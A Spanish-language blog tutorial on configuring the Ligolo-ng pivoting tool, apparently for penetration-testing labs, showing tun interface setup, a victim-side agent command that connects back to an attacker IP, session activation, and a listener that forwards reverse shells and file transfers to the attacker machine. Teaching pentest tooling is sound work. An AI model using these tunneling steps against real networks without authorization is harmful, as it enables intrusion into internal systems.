---
title: "Tutorial de Ligolo-NG"
date: Tue May 21 2024 02:00:00 GMT+0200 (Central European Summer Time)
categories: [Tutoriales, Ligolo-NG]
tags: [ligolo, ligolo-ng, proxy, pivoting]
image: /assets/img/cabeceras/ligolo-cab.png
---

### CONFIGURACIÓN Y PUESTA EN MARCHA DE LIGOLO-NG

##### ¿QUÉ ES LIGOLO-NG?

Ligolo-ng es una herramienta de pivoting alternativa a `chisel` y `socat`, ligera y rápida que permite establecer túneles inversos seguros sin necesidad de utilizar SOCKS. A diferencia de otras herramientas, Ligolo-ng crea un túnel virtual al estilo de una VPN, lo que facilita el pivotaje y el uso de herramientas como `nmap` o `netcat` sin tener que pasar por un proxy SOCKS. Gracias a esta característica, Ligolo-ng ofrece conexiones más rápidas y estables, mejorando significativamente el rendimiento en comparación con el uso de SOCKS.

##### DESCARGA

Nos descargaremos tanto el proxy como el cliente desde el repositorio oficial de GitHub [aquí](https://github.com/nicocha30/ligolo-ng){:target="_blank"}. Renombraremos los binarios (opcional) para una mejor manipulación.

##### MÁQUINA ATACANTE O PROXY (NUESTRA MÁQUINA):

Primero crearemos la interface "ligolo" y la inicializaremos:

```bash
$ sudo ip tuntap add user andy mode tun ligolo
$ sudo ip link set ligolo up
$ sudo ip route add 172.16.249.0/24 dev ligolo
```

Ejecutaremos el proxy por el puerto que queramos estar escuchando:

```bash
$ ./ligolo-proxy -selfcert 

O si queremos levantar la red directamente:
$ ./ligolo-proxy -selfcert -laddr 0.0.0.0:4433
```

![image](/assets/img/2024-05-21-LIGOLO-NG---Tutorial/Pasted-image-20231023195808.png)

----

##### MÁQUINA VÍCTIMA DE SALTO:

En la máquina víctima que nos hará de salto entre ambos segmentos de red ejecutaremos lo siguiente:

```bash
> .\ligolo-agent.exe -connect 192.168.45.237:11601 -ignore-cert -retry
...
time="2023-10-23T10:34:58-07:00" level=info msg="Connection established" addr="192.168.45.237:4433"
```

Y ya está. Este último paso lo tendremos que hacer por cada máquina que tenga un segmento de red al que no podemos acceder. No hace falta ser un usuario con altos privilegios para ejecutar el agente, ya sea una máquina Linux o Windows.

----

##### MÁQUINA PROXY:

Ahora si nos fijamos en nuestra máquina, veremos que tenemos una conexión entrante:

![image](/assets/img/2024-05-21-LIGOLO-NG---Tutorial/Pasted-image-20231023200157.png)

Pulsamos intro y activamos la sesión 1, que es la única que hay. Si hubiese más tendríamos que activarla antes de usar el túnel creado.

```bash
ligolo-ng >> session
ligolo-ng >> 1
ligolo-ng >> start
```

Probamos si tenemos conexión a la red a la que queremos llegar:

```bash
$ ping 172.16.249.11

PING 172.16.249.11 (172.16.249.11) 56(84) bytes of data.
64 bytes from 172.16.249.11: icmp_seq=1 ttl=64 time=47.5 ms
64 bytes from 172.16.249.11: icmp_seq=2 ttl=64 time=43.2 ms
64 bytes from 172.16.249.11: icmp_seq=3 ttl=64 time=42.9 ms
```

Fantástico!!! Ya tenemos conexión con el segmento de red desde nuestra máquina!

----
- <font color="#c0504d">LLEGADOS A ESTE PUNTO EL PROBLEMA QUE SE NOS PRESENTA ES QUE LAS MÁQUINAS A LAS QUE YA PODEMOS ACCEDER NO TIENEN CONEXIÓN DIRECTA HACIA NOSOTROS, POR LO QUE UNA REVERSE SHELL O TRANSFERENCIA DE ARCHIVOS NO FUNCIONARÍA. PARA SOLUCIONARLO HAREMOS UN</font> _PORT FORWARDING_ <font color="#c0504d"> HACIA NUESTRA MÁQUINA ATACANTE.</font>

----

#### PORT FORWARDING HACIA NUESTRA MÁQUINA (LISTENER LIGOLO-NG)

##### MÁQUINA PROXY

Vamos a nuestra consola proxy de _Ligolo_ y escribimos el listener que queremos levantar:

```bash
[Agent : WEB02\Administrator@WEB02] » listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

Esto significa que todo el tráfico que reciba la máquina de salto por el puerto 8080 lo recibirá nuestra máquina atacante por el puerto 80. De esta manera si queremos tener una reverse shell de cualquier máquina o transferir archivos, el exploit o la RS deberá apuntar a la IP y al puerto 8080 de la máquina de salto y nosotros deberemos escuchar en el puerto 80 con NC, Webserver de Python o cualquier servicio que hayamos levantado en nuestra máquina y queramos llegar desde la máquina víctima que está en otro segmento de red.

-----

#### LISTADO DE LISTENERS

Para ver un listado de todos los LISTENERS que tenemos activos lo podremos hacer con este sencillo comando desde nuestra consola de proxy de _Ligolo_.

```bash
[Agent : WEB02\Administrator@WEB02] » listener_list
```

![image](/assets/img/2024-05-21-LIGOLO-NG---Tutorial/Pasted-image-20231024162410.png)

-----

#### LIMPIEZA Y BORRADO DE INTERFACES

##### MÁQUINA PROXY:

Para borrar las interfaces y rutas creadas tenemos dos opciones, reiniciar nuestra máquina ya que no son configuraciones permanentes o, si no podemos o no queremos, ejecutaremos los siguientes comando en nuestra máquina:

```bash
$ sudo ip route del 172.16.249.0/24 dev ligolo
...
$ sudo ip link del ligolo
```


-----

Repositorio oficial de GitHub [aquí](https://github.com/nicocha30/ligolo-ng){:target="_blank"}
